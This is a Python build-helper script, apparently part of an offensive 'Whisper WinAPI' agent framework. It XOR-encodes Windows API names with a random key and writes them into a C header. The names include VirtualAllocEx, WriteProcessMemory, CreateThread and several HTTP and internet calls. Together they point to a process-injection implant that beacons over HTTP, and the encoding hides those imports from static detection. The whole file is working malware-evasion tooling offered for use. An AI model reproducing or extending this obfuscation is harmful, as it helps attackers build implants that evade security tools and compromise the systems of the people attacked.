## Build File, for agent specific build items
import random
import os
import logging
import pathlib

## give a logger here
# replace names to be the local path

"""
Individual Patch Script for binary

TLDR: Use this for custom edits on the binary at build. If this file is present, it will
call the ___ class, init it, and call the .build() method.

This is to maintain compatability with all binaries in the make system, so it just calls the CMAKE build, and 
no need for extra custom implementation stuff. 


"""


class Configure:
    def __init__(self, base_build_path):
        """
        Project Root: Root of agent project, ex: data/agent_templates/myagent/
        """
        # self.output_folder = pathlib.Path(output_folder)
        self.base_build_path = pathlib.Path(base_build_path)
        self.config_file = self.base_build_path / "whisper_config.h"  # Config file path

        self.OUTPUT_print_banner()

    def configure(self):
        """
        Perform configuration tasks
        """
        logging.info(f"Configuring for {self.base_build_path}")
        self.XOR_replace_function_names()

    def XOR_replace_function_names(self):
        """Perform XOR-based macro replacements in the header file."""
        logging.info("Performing XOR replacements in whisper_config.h")

        file_path = self.config_file
        function_names = [
            "MessageBoxA",
            "CreateThread",
            "ResumeThread",
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreatePipe",
            "SetHandleInformation",
            "CloseHandle",
            "InternetOpenA",
            "InternetConnectA",
            "HttpOpenRequestA",
            "HttpSendRequestA",
            "InternetOpenUrlW",
            "InternetReadFile",
            "InternetCloseHandle",
            "GetUserNameW",
            "Sleep",
            "WaitForSingleObject",
            "ReadFile",
        ]

        # Generate XOR key
        XOR_KEY = self.XOR_generate_key()
        macro_replacements = {
            "MACRO_FUNC_ENCRYPTED_NAME_KEY": f"0x{XOR_KEY.hex().upper()}",
        }

        logging.info(f"[XOR] XOR Key Used for Encryption: 0x{XOR_KEY.hex().upper()}")

        for func in function_names:
            encrypted_array = self.XOR_obfuscate_to_c_array(func, XOR_KEY)
            macro_replacements[f"MACRO_FUNC_{func}_ENCRYPTED_NAME"] = encrypted_array
            logging.info(
                f"[XOR] Replacing MACRO_FUNC_{func}_ENCRYPTED_NAME with {encrypted_array}"
            )

        # Read and replace macros in the header file
        try:
            if not file_path.exists():
                logging.warning(f"Config file {file_path} does not exist!")
                return

            with open(file_path, "r+", encoding="utf-8") as file:
                contents = file.read()
                modified_contents = contents

                for macro, value in macro_replacements.items():
                    if macro in modified_contents:
                        logging.info(
                            f"[XOR] Replacing {macro} with {value} in {file_path}"
                        )
                        modified_contents = modified_contents.replace(macro, value)
                    else:
                        logging.warning(f"Macro {macro} not found in {file_path}")

                # Write changes only if modifications occurred
                if modified_contents != contents:
                    file.seek(0)
                    file.write(modified_contents)
                    file.truncate()
                    logging.info(f"Successfully updated {file_path}")
                else:
                    logging.info(f"No replacements were made in {file_path}")

        except FileNotFoundError:
            logging.error(f"File {file_path} not found. Skipping.")
        except IOError as e:
            logging.error(f"File write error on {file_path}: {e}")
        except Exception as e:
            logging.error(f"Error processing {file_path}: {e}")

    def XOR_obfuscate_to_c_array(self, input_string: str, key: bytes):
        """
        XOR-obfuscate function name and return a formatted C-style hex array.
        """
        if not isinstance(key, bytes) or len(key) != 1:
            raise TypeError(
                f"XOR key must be a single-byte `bytes`, got {type(key).__name__}: {key}"
            )

        key_byte = key[0]
        input_bytes = input_string.encode("utf-8")
        obfuscated = [f"0x{b ^ key_byte:02X}" for b in input_bytes]
        obfuscated.append("0x00")
        result = "{ " + ", ".join(obfuscated) + " };"

        logging.debug(f"[DEBUG] XOR Key: {key.hex().upper()}")
        logging.debug(f"[DEBUG] Input Bytes: {input_bytes.hex().upper()}")
        logging.debug(f"[DEBUG] Obfuscated Output: {result}")

        return result

    def XOR_generate_key(self):
        """Generate a random XOR key as a single-byte `bytes` object."""
        while True:
            key = os.urandom(1)
            if key != b"\x00":
                return key

    def OUTPUT_print_banner(self):
        """Prints a banner"""
        logging.info("=" * 50)
        logging.info("Whisper WinAPI Standalone Configuration Script")
        # logging.info(f"Configuration Output Directory: {self.output_folder}")
        logging.info("=" * 50)
